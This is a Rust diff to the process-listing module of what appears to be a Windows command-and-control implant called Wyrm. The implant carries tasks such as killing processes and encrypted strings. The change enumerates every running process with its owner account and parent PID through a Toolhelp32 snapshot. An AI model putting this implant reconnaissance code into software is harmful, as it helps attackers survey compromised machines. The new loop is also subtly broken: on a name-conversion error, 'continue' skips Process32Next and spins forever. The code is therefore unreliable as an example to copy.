@@ -4,18 +4,21 @@ use serde::Serialize;
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
 use shared::{
-    process::Process,
+    stomped_structs::Process,
     tasks::{Task, WyrmResult},
 };
-use std::{mem::MaybeUninit, ptr::null_mut};
+use std::{ffi::CStr, mem::MaybeUninit, ptr::null_mut};
 use str_crypter::{decrypt_string, sc};
 use windows_sys::Win32::{
-    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
+    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, TRUE},
     Security::{
         GetTokenInformation, LookupAccountSidW, PSID, SID_NAME_USE, TOKEN_QUERY, TOKEN_USER,
         TokenUser,
     },
     System::{
+        Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, TH32CS_SNAPALL,
+        },
         ProcessStatus::EnumProcesses,
         Threading::{
             OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_TERMINATE,
@@ -28,10 +31,11 @@ use crate::utils::strings::utf_16_to_string_lossy;
 
 pub fn running_process_details() -> Option<impl Serialize> {
     // Get the pids; if we fail to do so, quit
-    let pids = get_pids().ok()?;
+    // let pids = get_pids().ok()?;
 
     // Convert the pids to Process types, and return the Option containing the Vec<Process>
-    pids_to_processes(pids)
+    // pids_to_processes(pids)
+    enum_all_processes()
 }
 
 /// Retrieves the PIDS of running processes
@@ -62,30 +66,30 @@ fn get_pids() -> Result<Vec<u32>, u32> {
     }
 }
 
-/// Converts a Vector of pids to pid:name type [`Process`]
-fn pids_to_processes(pids: Vec<u32>) -> Option<Vec<Process>> {
-    let mut processes = Vec::new();
+// /// Converts a Vector of pids to pid:name type [`Process`]
+// fn pids_to_processes(pids: Vec<u32>) -> Option<Vec<Process>> {
+//     let mut processes = Vec::new();
 
-    for pid in pids {
-        let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid) };
+//     for pid in pids {
+//         let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid) };
 
-        if handle.is_null() {
-            continue;
-        }
+//         if handle.is_null() {
+//             continue;
+//         }
 
-        let name = lookup_process_name(handle, pid);
-        let user = lookup_process_owner_name(handle, pid);
+//         let name = lookup_process_name(handle, pid);
+//         let user = lookup_process_owner_name(handle, pid);
 
-        processes.push(Process { pid, name, user });
-        let _ = unsafe { CloseHandle(handle) };
-    }
+//         processes.push(Process { pid, name, user });
+//         let _ = unsafe { CloseHandle(handle) };
+//     }
 
-    if processes.is_empty() {
-        return None;
-    }
+//     if processes.is_empty() {
+//         return None;
+//     }
 
-    Some(processes)
-}
+//     Some(processes)
+// }
 
 fn lookup_process_name(handle: HANDLE, pid: u32) -> String {
     const BUF_LEN: u32 = 512;
@@ -115,9 +119,15 @@ fn lookup_process_name(handle: HANDLE, pid: u32) -> String {
     parts[parts.len() - 1].to_string()
 }
 
-fn lookup_process_owner_name(handle: HANDLE, pid: u32) -> String {
+fn lookup_process_owner_name(pid: u32) -> String {
     let mut token_handle: HANDLE = HANDLE::default();
     let mut user = String::new();
+
+    let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid) };
+
+    if handle.is_null() {
+        return String::new();
+    }
 
     let result = unsafe { OpenProcessToken(handle, TOKEN_QUERY, &mut token_handle) } as u8;
 
@@ -272,4 +282,68 @@ pub fn kill_process(pid: &Task) -> Option<WyrmResult<String>> {
     }
 
     Some(WyrmResult::Ok(pid.to_string()))
+}
+
+// fn sort_processes(processes: Vec<Process>) {
+//     let mut sp = SortedProcesses(vec![]);
+//     for p in processes {
+//         if sp.0.is_empty() {
+//             sp.0.insert(p.pid as usize, SortedProcess::from(p.clone()));
+//             continue;
+//         }
+//     }
+// }
+
+fn enum_all_processes() -> Option<Vec<Process>> {
+    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0) };
+    if h_snapshot.is_null() {
+        return None;
+    }
+
+    let mut processes: Vec<Process> = Vec::new();
+
+    let mut process_entry = PROCESSENTRY32::default();
+    process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+
+    if unsafe { Process32First(h_snapshot, &mut process_entry) } == TRUE {
+        loop {
+            //
+            // Get the process name
+            //
+            let current_process_name_ptr = process_entry.szExeFile.as_ptr() as *const _;
+            let current_process_name =
+                match unsafe { CStr::from_ptr(current_process_name_ptr) }.to_str() {
+                    Ok(process) => process.to_string(),
+                    Err(e) => {
+                        #[cfg(debug_assertions)]
+                        print_failed(format!("Error converting process name. {e}"));
+
+                        continue;
+                    }
+                };
+
+            let pid = process_entry.th32ProcessID;
+
+            let username = lookup_process_owner_name(pid);
+            let ppid = process_entry.th32ParentProcessID;
+
+            processes.push(Process {
+                pid,
+                name: current_process_name,
+                user: username,
+                ppid,
+            });
+
+            // continue enumerating
+            if unsafe { Process32Next(h_snapshot, &mut process_entry) } == FALSE {
+                break;
+            }
+        }
+    }
+
+    unsafe {
+        let _ = CloseHandle(h_snapshot);
+    };
+
+    Some(processes)
 }
